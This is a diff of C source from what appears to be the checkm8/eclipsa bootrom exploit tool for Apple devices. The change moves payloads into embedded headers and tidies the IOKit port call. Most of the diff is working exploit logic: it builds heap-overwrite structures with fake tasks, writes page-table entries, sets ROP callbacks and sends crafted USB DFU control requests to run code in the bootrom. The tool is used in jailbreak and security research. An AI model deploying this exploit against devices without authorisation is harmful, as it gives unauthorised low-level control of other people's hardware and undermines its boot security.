@@ -183,6 +183,13 @@ typedef struct {
 	uint32_t sz;
 } transfer_ret_t;
 
+extern unsigned payload_A9_bin_len, payload_notA9_bin_len, payload_handle_checkm8_request_bin_len;
+extern uint8_t payload_A9_bin[], payload_notA9_bin[], payload_handle_checkm8_request_bin[];
+
+#include "payload_A9.h"
+#include "payload_notA9.h"
+#include "payload_handle_checkm8_request.h"
+
 static enum {
 	STAGE_RESET,
 	STAGE_SPRAY,
@@ -480,7 +487,7 @@ wait_usb_handle(usb_handle_t *handle, uint8_t usb_interface, uint8_t usb_alt_int
 	while((matching_dict = IOServiceMatching(darwin_device_class)) != NULL) {
 		cf_dictionary_set_int16(matching_dict, CFSTR(kUSBVendorID), handle->vid);
 		cf_dictionary_set_int16(matching_dict, CFSTR(kUSBProductID), handle->pid);
-		if(IOServiceGetMatchingServices(kIOMasterPortDefault, matching_dict, &iter) == kIOReturnSuccess) {
+		if(IOServiceGetMatchingServices(0, matching_dict, &iter) == kIOReturnSuccess) {
 			while((serv = IOIteratorNext(iter)) != IO_OBJECT_NULL) {
 				if(open_usb_device(serv, handle)) {
 					if(open_usb_interface(usb_interface, usb_alt_interface, handle)) {
@@ -1168,147 +1175,136 @@ checkm8_stage_patch(const usb_handle_t *handle) {
 
 	payload = NULL;
 	if(cpid == 0x8000 || cpid == 0x8003) {
-		if(read_binary_file("payload_A9.bin", &payload, &payload_sz)) {
-			if(payload_sz > sizeof(A9)) {
-				payload_sz -= sizeof(A9);
-			} else {
-				free(payload);
-				payload = NULL;
-			}
-		}
-	} else if(read_binary_file("payload_notA9.bin", &payload, &payload_sz)) {
-		if(payload_sz > sizeof(notA9)) {
-			payload_sz -= sizeof(notA9);
+		if(payload_A9_bin_len > sizeof(A9)) {
+			payload = payload_A9_bin;
+			payload_sz = payload_A9_bin_len - sizeof(A9);
 		} else {
-			free(payload);
 			payload = NULL;
+			payload_sz = 0;
 		}
+	} else if(payload_notA9_bin_len > sizeof(notA9)) {
+		payload = payload_notA9_bin;
+		payload_sz = payload_notA9_bin_len - sizeof(notA9);
+	} else {
+		payload = NULL;
+		payload_sz = 0;
 	}
-	if(payload != NULL) {
-		if(read_binary_file("payload_handle_checkm8_request.bin", &payload_handle_checkm8_request, &payload_handle_checkm8_request_sz)) {
-			if(payload_handle_checkm8_request_sz > sizeof(handle_checkm8_request)) {
-				payload_handle_checkm8_request_sz -= sizeof(handle_checkm8_request);
-				if((data = calloc(1, DFU_MAX_TRANSFER_SZ + payload_sz + sizeof(A9) + payload_handle_checkm8_request_sz + sizeof(handle_checkm8_request))) != NULL) {
-					if(cpid == 0x8001 || cpid == 0x8010 || cpid == 0x8011 || cpid == 0x8012 || cpid == 0x8015) {
-						reg = 0x1000006A5;
-						memcpy(data + ttbr0_vrom_off, &reg, sizeof(reg));
-						reg = 0x60000100000625;
-						memcpy(data + ttbr0_vrom_off + sizeof(reg), &reg, sizeof(reg));
-						reg = 0x60000180000625;
-						memcpy(data + ttbr0_sram_off, &reg, sizeof(reg));
-						reg = 0x1800006A5;
-						memcpy(data + ttbr0_sram_off + sizeof(reg), &reg, sizeof(reg));
-						usb_rop_callbacks(data + offsetof(dfu_callback_t, callback), insecure_memory_base, callbacks, sizeof(callbacks) / sizeof(callbacks[0]));
-						data_sz = ttbr0_sram_off + 2 * sizeof(reg);
-					} else {
-						data_sz = 0;
-					}
-					memcpy(data + data_sz, payload, payload_sz);
-					data_sz += payload_sz;
-					if(cpid == 0x8000 || cpid == 0x8003) {
-						memset(A9.pwnd, '\0', sizeof(A9.pwnd));
-						memcpy(A9.pwnd, pwnd_str, strlen(pwnd_str));
-						A9.payload_dest = boot_tramp_end - payload_handle_checkm8_request_sz - sizeof(handle_checkm8_request);
-						A9.dfu_handle_request = dfu_handle_request;
-						A9.payload_off = payload_sz + sizeof(A9);
-						A9.payload_sz = payload_handle_checkm8_request_sz + sizeof(handle_checkm8_request);
-						A9.memcpy_addr = memcpy_addr;
-						A9.gUSBSerialNumber = gUSBSerialNumber;
-						A9.usb_create_string_descriptor = usb_create_string_descriptor;
-						A9.usb_serial_number_string_descriptor = usb_serial_number_string_descriptor;
-						A9.ttbr0_vrom_addr = ttbr0_addr + ttbr0_vrom_off;
-						A9.patch_addr = patch_addr;
-						memcpy(data + data_sz, &A9, sizeof(A9));
-						data_sz += sizeof(A9);
-					} else {
-						memset(notA9.pwnd, '\0', sizeof(notA9.pwnd));
-						memcpy(notA9.pwnd, pwnd_str, strlen(pwnd_str));
-						notA9.payload_dest = boot_tramp_end - payload_handle_checkm8_request_sz - sizeof(handle_checkm8_request);
-						notA9.dfu_handle_request = dfu_handle_request;
-						notA9.payload_off = payload_sz + sizeof(notA9);
-						notA9.payload_sz = payload_handle_checkm8_request_sz + sizeof(handle_checkm8_request);
-						notA9.memcpy_addr = memcpy_addr;
-						notA9.gUSBSerialNumber = gUSBSerialNumber;
-						notA9.usb_create_string_descriptor = usb_create_string_descriptor;
-						notA9.usb_serial_number_string_descriptor = usb_serial_number_string_descriptor;
-						notA9.patch_addr = patch_addr;
-						if(cpid == 0x8001 || cpid == 0x8010 || cpid == 0x8011 || cpid == 0x8012 || cpid == 0x8015) {
-							notA9.patch_addr += ARM_16K_TT_L2_SZ;
-						}
-						memcpy(data + data_sz, &notA9, sizeof(notA9));
-						data_sz += sizeof(notA9);
-					}
-					memcpy(data + data_sz, payload_handle_checkm8_request, payload_handle_checkm8_request_sz);
-					data_sz += payload_handle_checkm8_request_sz;
-					handle_checkm8_request.handle_interface_request = handle_interface_request;
-					handle_checkm8_request.insecure_memory_base = insecure_memory_base;
-					handle_checkm8_request.exec_magic = EXEC_MAGIC;
-					handle_checkm8_request.done_magic = DONE_MAGIC;
-					handle_checkm8_request.usb_core_do_transfer = usb_core_do_transfer;
-					memcpy(data + data_sz, &handle_checkm8_request, sizeof(handle_checkm8_request));
-					data_sz += sizeof(handle_checkm8_request);
-					overwrite = NULL;
-					overwrite_sz = 0;
-					if(cpid == 0x7000 || cpid == 0x7001 || cpid == 0x8000 || cpid == 0x8003) {
-						memset(&eclipsa_overwrite, '\0', sizeof(eclipsa_overwrite));
-						eclipsa_overwrite.synopsys_task.id = 5;
-						strcpy(eclipsa_overwrite.synopsys_task.name, "usb");
-						eclipsa_overwrite.synopsys_task.magic_1 = TASK_MAGIC_1;
-						eclipsa_overwrite.synopsys_task.stack_len = TASK_STACK_MIN;
-						eclipsa_overwrite.synopsys_task.routine = synopsys_routine_addr;
-						eclipsa_overwrite.synopsys_task.stack_base = io_buffer_addr + offsetof(eclipsa_overwrite_t, fake_task);
-						eclipsa_overwrite.synopsys_task.ret_waiters_list.prev = eclipsa_overwrite.synopsys_task.ret_waiters_list.next = eclipsa_overwrite.synopsys_task.stack_base + offsetof(dfu_task_t, queue_list);
-						eclipsa_overwrite.heap_block.prev_sz = sizeof(eclipsa_overwrite.synopsys_task) / sizeof(eclipsa_overwrite.heap_block) + 1;
-						eclipsa_overwrite.heap_block.this_sz = eclipsa_overwrite.synopsys_task.stack_len / sizeof(eclipsa_overwrite.heap_block) + 2;
-						eclipsa_overwrite.fake_task.id = 6;
-						eclipsa_overwrite.fake_task.irq_dis_cnt = 1;
-						eclipsa_overwrite.fake_task.state = TASK_RUNNING;
-						eclipsa_overwrite.fake_task.magic_1 = TASK_MAGIC_1;
-						strcpy(eclipsa_overwrite.fake_task.name, "eclipsa");
-						eclipsa_overwrite.fake_task.magic_0 = TASK_STACK_MAGIC;
-						eclipsa_overwrite.fake_task.arch.lr = arch_task_tramp_addr;
-						memcpy(eclipsa_overwrite.fake_task.arch.shc, data, data_sz);
-						eclipsa_overwrite.fake_task.stack_len = eclipsa_overwrite.synopsys_task.stack_len;
-						eclipsa_overwrite.fake_task.stack_base = eclipsa_overwrite.synopsys_task.stack_base;
-						eclipsa_overwrite.fake_task.arch.sp = eclipsa_overwrite.fake_task.stack_base + eclipsa_overwrite.fake_task.stack_len;
-						eclipsa_overwrite.fake_task.routine = eclipsa_overwrite.fake_task.stack_base + offsetof(dfu_task_t, arch.shc);
-						eclipsa_overwrite.fake_task.queue_list.prev = eclipsa_overwrite.fake_task.queue_list.next = io_buffer_addr + offsetof(dfu_task_t, ret_waiters_list);
-						eclipsa_overwrite.fake_task.ret_waiters_list.prev = eclipsa_overwrite.fake_task.ret_waiters_list.next = eclipsa_overwrite.fake_task.stack_base + offsetof(dfu_task_t, ret_waiters_list);
-						overwrite = &eclipsa_overwrite.synopsys_task.callout;
-						overwrite_sz = sizeof(eclipsa_overwrite) - offsetof(eclipsa_overwrite_t, synopsys_task.callout);
-					} else if(checkm8_usb_request_stall(handle) && checkm8_usb_request_leak(handle)) {
-						memset(&checkm8_overwrite, '\0', sizeof(checkm8_overwrite));
-						if(cpid != 0x8960) {
-							checkm8_overwrite.callback.callback = nop_gadget;
-							checkm8_overwrite.callback.next = insecure_memory_base;
-							checkm8_overwrite.heap_pad_0 = 0xF7F6F5F4F3F2F1F0;
-							checkm8_overwrite.heap_pad_1 = 0xFFFEFDFCFBFAF9F8;
-						} else {
-							checkm8_overwrite.callback.callback = insecure_memory_base;
-						}
-						overwrite = &checkm8_overwrite;
-						overwrite_sz = sizeof(checkm8_overwrite);
-					}
-					if(overwrite != NULL && send_usb_control_request(handle, 0, 0, 0, 0, overwrite, overwrite_sz, &transfer_ret) && transfer_ret.ret == USB_TRANSFER_STALL && send_usb_control_request_no_data(handle, 0x21, DFU_DNLOAD, 0, 0, EP0_MAX_PACKET_SZ, NULL)) {
-						ret = true;
-						if(cpid == 0x7000 || cpid == 0x7001 || cpid == 0x8000 || cpid == 0x8003) {
-							send_usb_control_request_no_data(handle, 0x21, DFU_CLR_STATUS, 0, 0, 0, NULL);
-						} else if(!dfu_send_data(handle, data, data_sz, false)) {
-							ret = false;
-						}
-					}
-					free(data);
-				} else {
-					stage = STAGE_ERROR;
-				}
+	if(payload != NULL && payload_handle_checkm8_request_bin_len > sizeof(handle_checkm8_request)) {
+		payload_handle_checkm8_request = payload_handle_checkm8_request_bin;
+		payload_handle_checkm8_request_sz = payload_handle_checkm8_request_bin_len - sizeof(handle_checkm8_request);
+		if((data = calloc(1, DFU_MAX_TRANSFER_SZ + payload_sz + sizeof(A9) + payload_handle_checkm8_request_sz + sizeof(handle_checkm8_request))) != NULL) {
+			if(cpid == 0x8001 || cpid == 0x8010 || cpid == 0x8011 || cpid == 0x8012 || cpid == 0x8015) {
+				reg = 0x1000006A5;
+				memcpy(data + ttbr0_vrom_off, &reg, sizeof(reg));
+				reg = 0x60000100000625;
+				memcpy(data + ttbr0_vrom_off + sizeof(reg), &reg, sizeof(reg));
+				reg = 0x60000180000625;
+				memcpy(data + ttbr0_sram_off, &reg, sizeof(reg));
+				reg = 0x1800006A5;
+				memcpy(data + ttbr0_sram_off + sizeof(reg), &reg, sizeof(reg));
+				usb_rop_callbacks(data + offsetof(dfu_callback_t, callback), insecure_memory_base, callbacks, sizeof(callbacks) / sizeof(callbacks[0]));
+				data_sz = ttbr0_sram_off + 2 * sizeof(reg);
 			} else {
-				stage = STAGE_ERROR;
+				data_sz = 0;
 			}
-			free(payload_handle_checkm8_request);
+			memcpy(data + data_sz, payload, payload_sz);
+			data_sz += payload_sz;
+			if(cpid == 0x8000 || cpid == 0x8003) {
+				memset(A9.pwnd, '\0', sizeof(A9.pwnd));
+				memcpy(A9.pwnd, pwnd_str, strlen(pwnd_str));
+				A9.payload_dest = boot_tramp_end - payload_handle_checkm8_request_sz - sizeof(handle_checkm8_request);
+				A9.dfu_handle_request = dfu_handle_request;
+				A9.payload_off = payload_sz + sizeof(A9);
+				A9.payload_sz = payload_handle_checkm8_request_sz + sizeof(handle_checkm8_request);
+				A9.memcpy_addr = memcpy_addr;
+				A9.gUSBSerialNumber = gUSBSerialNumber;
+				A9.usb_create_string_descriptor = usb_create_string_descriptor;
+				A9.usb_serial_number_string_descriptor = usb_serial_number_string_descriptor;
+				A9.ttbr0_vrom_addr = ttbr0_addr + ttbr0_vrom_off;
+				A9.patch_addr = patch_addr;
+				memcpy(data + data_sz, &A9, sizeof(A9));
+				data_sz += sizeof(A9);
+			} else {
+				memset(notA9.pwnd, '\0', sizeof(notA9.pwnd));
+				memcpy(notA9.pwnd, pwnd_str, strlen(pwnd_str));
+				notA9.payload_dest = boot_tramp_end - payload_handle_checkm8_request_sz - sizeof(handle_checkm8_request);
+				notA9.dfu_handle_request = dfu_handle_request;
+				notA9.payload_off = payload_sz + sizeof(notA9);
+				notA9.payload_sz = payload_handle_checkm8_request_sz + sizeof(handle_checkm8_request);
+				notA9.memcpy_addr = memcpy_addr;
+				notA9.gUSBSerialNumber = gUSBSerialNumber;
+				notA9.usb_create_string_descriptor = usb_create_string_descriptor;
+				notA9.usb_serial_number_string_descriptor = usb_serial_number_string_descriptor;
+				notA9.patch_addr = patch_addr;
+				if(cpid == 0x8001 || cpid == 0x8010 || cpid == 0x8011 || cpid == 0x8012 || cpid == 0x8015) {
+					notA9.patch_addr += ARM_16K_TT_L2_SZ;
+				}
+				memcpy(data + data_sz, &notA9, sizeof(notA9));
+				data_sz += sizeof(notA9);
+			}
+			memcpy(data + data_sz, payload_handle_checkm8_request, payload_handle_checkm8_request_sz);
+			data_sz += payload_handle_checkm8_request_sz;
+			handle_checkm8_request.handle_interface_request = handle_interface_request;
+			handle_checkm8_request.insecure_memory_base = insecure_memory_base;
+			handle_checkm8_request.exec_magic = EXEC_MAGIC;
+			handle_checkm8_request.done_magic = DONE_MAGIC;
+			handle_checkm8_request.usb_core_do_transfer = usb_core_do_transfer;
+			memcpy(data + data_sz, &handle_checkm8_request, sizeof(handle_checkm8_request));
+			data_sz += sizeof(handle_checkm8_request);
+			overwrite = NULL;
+			overwrite_sz = 0;
+			if(cpid == 0x7000 || cpid == 0x7001 || cpid == 0x8000 || cpid == 0x8003) {
+				memset(&eclipsa_overwrite, '\0', sizeof(eclipsa_overwrite));
+				eclipsa_overwrite.synopsys_task.id = 5;
+				strcpy(eclipsa_overwrite.synopsys_task.name, "usb");
+				eclipsa_overwrite.synopsys_task.magic_1 = TASK_MAGIC_1;
+				eclipsa_overwrite.synopsys_task.stack_len = TASK_STACK_MIN;
+				eclipsa_overwrite.synopsys_task.routine = synopsys_routine_addr;
+				eclipsa_overwrite.synopsys_task.stack_base = io_buffer_addr + offsetof(eclipsa_overwrite_t, fake_task);
+				eclipsa_overwrite.synopsys_task.ret_waiters_list.prev = eclipsa_overwrite.synopsys_task.ret_waiters_list.next = eclipsa_overwrite.synopsys_task.stack_base + offsetof(dfu_task_t, queue_list);
+				eclipsa_overwrite.heap_block.prev_sz = sizeof(eclipsa_overwrite.synopsys_task) / sizeof(eclipsa_overwrite.heap_block) + 1;
+				eclipsa_overwrite.heap_block.this_sz = eclipsa_overwrite.synopsys_task.stack_len / sizeof(eclipsa_overwrite.heap_block) + 2;
+				eclipsa_overwrite.fake_task.id = 6;
+				eclipsa_overwrite.fake_task.irq_dis_cnt = 1;
+				eclipsa_overwrite.fake_task.state = TASK_RUNNING;
+				eclipsa_overwrite.fake_task.magic_1 = TASK_MAGIC_1;
+				strcpy(eclipsa_overwrite.fake_task.name, "eclipsa");
+				eclipsa_overwrite.fake_task.magic_0 = TASK_STACK_MAGIC;
+				eclipsa_overwrite.fake_task.arch.lr = arch_task_tramp_addr;
+				memcpy(eclipsa_overwrite.fake_task.arch.shc, data, data_sz);
+				eclipsa_overwrite.fake_task.stack_len = eclipsa_overwrite.synopsys_task.stack_len;
+				eclipsa_overwrite.fake_task.stack_base = eclipsa_overwrite.synopsys_task.stack_base;
+				eclipsa_overwrite.fake_task.arch.sp = eclipsa_overwrite.fake_task.stack_base + eclipsa_overwrite.fake_task.stack_len;
+				eclipsa_overwrite.fake_task.routine = eclipsa_overwrite.fake_task.stack_base + offsetof(dfu_task_t, arch.shc);
+				eclipsa_overwrite.fake_task.queue_list.prev = eclipsa_overwrite.fake_task.queue_list.next = io_buffer_addr + offsetof(dfu_task_t, ret_waiters_list);
+				eclipsa_overwrite.fake_task.ret_waiters_list.prev = eclipsa_overwrite.fake_task.ret_waiters_list.next = eclipsa_overwrite.fake_task.stack_base + offsetof(dfu_task_t, ret_waiters_list);
+				overwrite = &eclipsa_overwrite.synopsys_task.callout;
+				overwrite_sz = sizeof(eclipsa_overwrite) - offsetof(eclipsa_overwrite_t, synopsys_task.callout);
+			} else if(checkm8_usb_request_stall(handle) && checkm8_usb_request_leak(handle)) {
+				memset(&checkm8_overwrite, '\0', sizeof(checkm8_overwrite));
+				if(cpid != 0x8960) {
+					checkm8_overwrite.callback.callback = nop_gadget;
+					checkm8_overwrite.callback.next = insecure_memory_base;
+					checkm8_overwrite.heap_pad_0 = 0xF7F6F5F4F3F2F1F0;
+					checkm8_overwrite.heap_pad_1 = 0xFFFEFDFCFBFAF9F8;
+				} else {
+					checkm8_overwrite.callback.callback = insecure_memory_base;
+				}
+				overwrite = &checkm8_overwrite;
+				overwrite_sz = sizeof(checkm8_overwrite);
+			}
+			if(overwrite != NULL && send_usb_control_request(handle, 0, 0, 0, 0, overwrite, overwrite_sz, &transfer_ret) && transfer_ret.ret == USB_TRANSFER_STALL && send_usb_control_request_no_data(handle, 0x21, DFU_DNLOAD, 0, 0, EP0_MAX_PACKET_SZ, NULL)) {
+				ret = true;
+				if(cpid == 0x7000 || cpid == 0x7001 || cpid == 0x8000 || cpid == 0x8003) {
+					send_usb_control_request_no_data(handle, 0x21, DFU_CLR_STATUS, 0, 0, 0, NULL);
+				} else if(!dfu_send_data(handle, data, data_sz, false)) {
+					ret = false;
+				}
+			}
+			free(data);
 		} else {
 			stage = STAGE_ERROR;
 		}
-		free(payload);
 	} else {
 		stage = STAGE_ERROR;
 	}
